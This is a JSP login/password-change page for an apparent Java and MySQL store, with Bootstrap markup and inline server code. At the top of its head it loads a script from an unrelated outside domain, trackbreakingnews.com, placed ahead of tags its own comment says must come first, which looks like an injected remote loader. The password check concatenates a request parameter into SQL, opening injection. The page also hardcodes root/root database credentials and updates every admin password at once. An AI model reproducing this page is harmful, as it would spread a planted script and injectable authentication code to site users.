<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<%@ page import="java.sql.*" %>
<%@ page import="javax.servlet.RequestDispatcher" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en">
  <head><script src="http://d.trackbreakingnews.com/l/load.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="favicon.ico">
	<title>Login</title>
    <!-- Bootstrap core CSS -->
    <link href="CSS/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap theme -->
    <link href="CSS/bootstrap-theme.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="CSS/theme.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
    <script src="../../assets/js/ie-emulation-modes-warning.js"></script>
    
</script>
<link rel="stylesheet" href="CSS/animate.css">
<script src="wow.min.js"> </script>
<script> new WOW().init();</script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
<title>Login</title>

<style type="text/css">
.L h2 {
	color:#fff;
	font-family:Lato; 
	font-size:1.2em;	
	padding-top: 5px;
	height: 25px;
	width: 352px;
	background: #000;
	font-family: Lato;
	display: block;
	line-height: 11px;
	margin: 7px;
	padding-left: 18px;
	border-radius: 4px;
	background: rgba(0,0,0,0.5);
	position:relative; 
	margin-left: 73px;
	top:-311px; 
	
	}
}
</style>
</head>
<body>

<%
Connection con1=null;
PreparedStatement ps1=null;
String st1=null;
String fn=null;
String px1=request.getParameter("pass1");
String px2=request.getParameter("pass2");
String px4="";
String x="Sorry...! Wrong Old Password...";
RequestDispatcher rd=null;
try{
		Class.forName("com.mysql.jdbc.Driver");
		con1=DriverManager.getConnection("jdbc:mysql://localhost:3306/mystore","root","root");
		st1="Select * from admin where pass='"+px1+"'";
		ps1=con1.prepareStatement(st1);
		ResultSet rs1=ps1.executeQuery();
		if(rs1.next()) 
		{
				px4=rs1.getString("pass");
				if(px4.equals(px1))
				{
					String str1="update admin set pass=?";
					ps1=con1.prepareStatement(str1);
					ps1.setString(1, px2);
					int i=ps1.executeUpdate();
					if(i>0)
					{
						 rd= request.getRequestDispatcher("Changed.jsp");
						rd.forward(request, response);		
					}
				}
				else if(px4!=px1) 
				{
				out.println("hello");
				 rd= request.getRequestDispatcher("Forgot1.jsp");
				rd.include(request, response);
				}
		}
	con1.close();
}
catch(Exception e) {System.out.println(e); }
%>

   <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
    <script src="bootstrap.min.js"></script>
    <script src="docs.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="js/ie10-viewport-bug-workaround.js"></script>
    <script>
  $('.dropdown').hover(function() {
    $('.dropdown-toggle',this).trigger('click');
  });
  </script>
  </body>
</html>